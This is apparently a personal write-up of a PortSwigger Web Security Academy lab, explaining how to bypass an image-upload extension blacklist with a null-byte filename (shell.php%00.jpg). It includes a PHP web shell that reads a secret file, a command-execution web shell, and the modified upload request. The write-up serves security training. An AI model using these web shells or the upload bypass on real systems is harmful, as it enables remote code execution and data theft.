
# #PortSwigger 


![[Pasted image 20251215235247.png]]


## Lab Description

> This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.
> 
> **Objective:** Upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
> 
> - **Your credentials:** `wiener:peter`

---
---

## Step 1: Understanding the Vulnerability

**The obfuscation technique:**
- The server blacklists `.php` extensions
- However, it uses a flawed filename validation that stops at null bytes
- A null byte (`%00` or `0x00`) tells the server to ignore everything after it

**The attack:**
1. Name the file: `exploit.php%00.jpg`
2. The server sees the `.jpg` extension and accepts the file
3. When saving, the null byte causes `.jpg` to be stripped
4. The file is saved as `exploit.php`
5. PHP code executes when accessed

**Why this works:**
- In older PHP versions, null bytes terminate strings
- `exploit.php%00.jpg` -> string ends at `%00` -> becomes `exploit.php`

---

## Step 2: Reconnaissance

### Step 2.1: Log In

1. Log in with `wiener:peter`
2. Go to **My account** page

### Step 2.2: Test Normal Upload

Upload a legitimate image to understand the flow.

### Step 2.3: Test PHP Upload (Blocked)

Attempt to upload `shell.php`:

**Response:** Error - only JPG and PNG files allowed.

---

## Step 3: Creating the PHP Web Shell

### Step 3.1: Create shell.php

```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### Step 3.2: Alternative Web Shell

```
<?php system($_GET['command']); ?>
```

![[Pasted image 20251216000120.png]]


---

## Step 4: Obfuscating the Filename

### Step 4.1: The Null Byte Trick

Change the filename from `shell.php` to:
```
shell.php%00.jpg
```

**URL encoded:** `%00` represents the null byte.

### Step 4.2: Modify the Upload Request

Intercept the upload request in Burp:

**Original:**
```
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Modified:**
```
Content-Disposition: form-data; name="avatar"; filename="shell.php%00.jpg"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```


### Step 4.3: Send the Request

Forward the modified request.

**Response:**
```
The file avatars/shell.php has been uploaded.
```

Notice: The message refers to `shell.php`, not `shell.php%00.jpg`. The null byte and `.jpg` were stripped!

Upload successful.

---

## Step 5: Executing the Web Shell

### Step 5.1: Access the File

Send a `GET` request to:
```
GET /files/avatars/shell.php HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

### Step 5.2: Get the Secret

The response contains Carlos's secret.

![[Pasted image 20251216000430.png]]

---

## Step 6: Submitting the Secret

1. Go back to the lab page
2. Click **Submit solution**
3. Enter the secret
4. Click **OK**

![[Pasted image 20251216000444.png]]


---

## Step 7: Lab Solved

Success message displayed:

![[Pasted image 20251216000454.png]]

---
---
